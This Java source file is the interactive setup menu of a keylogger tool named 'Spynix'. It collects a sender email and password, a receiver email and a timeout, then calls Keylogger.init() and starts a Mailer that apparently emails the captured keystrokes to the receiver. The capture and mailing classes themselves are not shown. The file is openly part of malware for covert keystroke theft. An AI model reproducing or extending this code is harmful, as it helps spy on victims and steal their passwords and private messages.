package ml.inix.menu;

import ml.inix.Config;
import ml.inix.loggers.Keylogger;
import ml.inix.service.Mailer;
import ml.inix.util.Color;
import ml.inix.util.FileManager;
import ml.inix.util.Log;

import java.util.Scanner;

public class Menu {

    private final Scanner scanner;

    public Menu() {
        this.scanner = new Scanner(System.in);
        displayMenu();
        setup();
    }

    private void displayMenu() {
        Log.out(MenuUtil.TITLE);
        Log.out(MenuUtil.DISCLAIMER);
        scanner.nextLine();
    }

    private void setup() {
        Log.out(MenuUtil.SETUP_INFO);
        Log.out(Color.CYAN + "[*] SETUP INFORMATION \n");

        Log.out(Color.GREEN + "[*] Enter sender email: " + Color.RESET);
        Config.SENDER_EMAIL = scanner.nextLine();
        while (!Log.isValidMail(Config.SENDER_EMAIL)) {
            Log.out(Color.GREEN + "[*] Enter sender email: " + Color.RESET);
            Config.SENDER_EMAIL = scanner.nextLine();
        }

        Log.out(Color.GREEN + "[*] Enter sender email password: " + Color.RESET);
        Config.SENDER_PASS = scanner.nextLine();
        while (Config.SENDER_PASS.equalsIgnoreCase("")) {
            Log.out(Color.GREEN + "[*] Enter sender email password: " + Color.RESET);
            Config.SENDER_PASS = scanner.nextLine();
        }

        Log.out(Color.GREEN + "[*] Enter receiver email: " + Color.RESET);
        Config.REC_MAIL = scanner.nextLine();
        while (!Log.isValidMail(Config.SENDER_EMAIL)) {
            Log.out(Color.GREEN + "[*] Enter receiver email: " + Color.RESET);
            Config.REC_MAIL = scanner.nextLine();
        }

        Log.out(Color.GREEN + "[*] Enter email timeout (in seconds): " + Color.RESET);
        String TIMEOUT = scanner.nextLine();
        while (!TIMEOUT.trim().matches("[0-9]+")) {
            Log.out(Color.GREEN + "[*] Enter email timeout (in seconds): " + Color.RESET);
            TIMEOUT = scanner.nextLine();
        }
        Config.TIMEOUT = Integer.parseInt(TIMEOUT);

        confirm();
    }

    private void confirm() {
        String confirmText = "";

        Log.out("\n"
                + Color.GREEN + " +------------------------------------------+\n"
                + Color.GREEN + "   Sender Email: " + Color.WHITE + Config.SENDER_EMAIL + "\n"
                + Color.GREEN + "   Password: " + Color.WHITE + Config.SENDER_PASS + "\n"
                + Color.GREEN + "   Receiver Email: " + Color.WHITE + Config.REC_MAIL + "\n"
                + Color.GREEN + "   Email Timeout [in second]: " + Color.WHITE + Config.TIMEOUT + "\n"
                + Color.GREEN + " +------------------------------------------+"
        );

        do {
            Log.out("\n[*] Proceed with above information? (y/n): " + Color.WHITE);
            confirmText = scanner.nextLine();
        }
        while (confirmText.trim().isEmpty());

        if (confirmText.trim().equalsIgnoreCase("y")) {
            Log.out(Color.CYAN + "[*] Spynix initiated...");
            FileManager.createReqFiles();
            FileManager.clearAllData();
            Keylogger.init();
            new Mailer();
        }
        else if (confirmText.trim().equalsIgnoreCase("n")) {
            Log.wait(1);
            setup();
        }
        else {
            Log.out(Color.RED + "[!] Invalid input");
            Log.wait(1);
            confirm();
        }
    }
}
